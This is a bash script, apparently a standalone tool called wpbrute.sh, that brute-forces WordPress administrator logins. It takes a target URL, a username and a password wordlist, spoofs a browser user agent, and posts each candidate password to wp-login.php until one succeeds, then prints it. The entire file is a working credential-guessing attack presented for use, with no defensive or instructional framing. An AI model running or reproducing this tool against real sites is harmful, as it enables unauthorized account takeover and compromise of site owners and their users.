#!/bin/bash

#
# --------------------------------------------------------------------------------
# "THE BEER-WARE LICENSE" (Revision 42):
# guelfoweb@gmail.com wrote this file. As long as you retain this notice you
# can do whatever you want with this stuff. If we meet some day, and you think
# this stuff is worth it, you can buy me a beer in return Gianni 'guelfoweb' Amato
# --------------------------------------------------------------------------------
#

# v.1.1

USER_AGENT="Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:21.0) Gecko/20130331 Firefox/21.0"
TIMEOUT=1
COOKIE=cookie-`date +%s`
COOKIE_PATH="/tmp/$COOKIE"

# Get arguments
args_array=( $@ )
len_args=${#args_array[@]}

if [ "$len_args" -ne 3 ]; then
	# Help
	echo -e "Arguments:\n\t--url\t\twordpress url\n\t--user\t\twordpress username\n\t--wordlist\tpath to password wordlist\n"
	echo -e "Example:\n./wpbrute.sh --url=www.example.com --user=admin --wordlist=wordlist.txt"
	exit
else
	# Check arguments
	WP_ADMIN=`echo $@ | grep -o "\-\-user=.*" | cut -d\= -f2 | cut -d" " -f1`
	WP_PASSWORD=`echo $@ | grep -o "\-\-wordlist=.*" | cut -d\= -f2 | cut -d" " -f1`
	if [ ! -f "$WP_PASSWORD" ]; then echo "Wordlist not found: $WP_PASSWORD"; exit; fi
	WP_URL=`echo $@ | grep -o "\-\-url=.*" | cut -d\= -f2 | cut -d" " -f1`
	CHECK_URL=`curl -o /dev/null --silent --head --write-out '%{http_code}\n' $WP_URL/wp-login.php`
	if [ "$CHECK_URL" -ne 200 ]; then echo -e "Url error: $WP_URL\nHTTP CODE: $CHECK_URL"; exit; fi
fi

# Start
curl -s -A "$USER_AGENT" -c "$COOKIE_PATH" $WP_URL/wp-login > /dev/null
cat "$WP_PASSWORD" | while read line;
	do {
		echo $line
		REQ=`curl -s -b "$COOKIE_PATH" -A "$USER_AGENT" --connect-timeout $TIMEOUT -d log="$WP_ADMIN" -d pwd="$line" -d wp-submit="Log In" -d redirect_to="$WP_URL/wp-admin" -d testcookie=1 $WP_URL/wp-login.php`

		if [ "$REQ" == "" ]; then echo "The password is: $line"; rm "$COOKIE_PATH"; exit; fi
	}
	done

rm "$COOKIE_PATH" 2> /dev/null
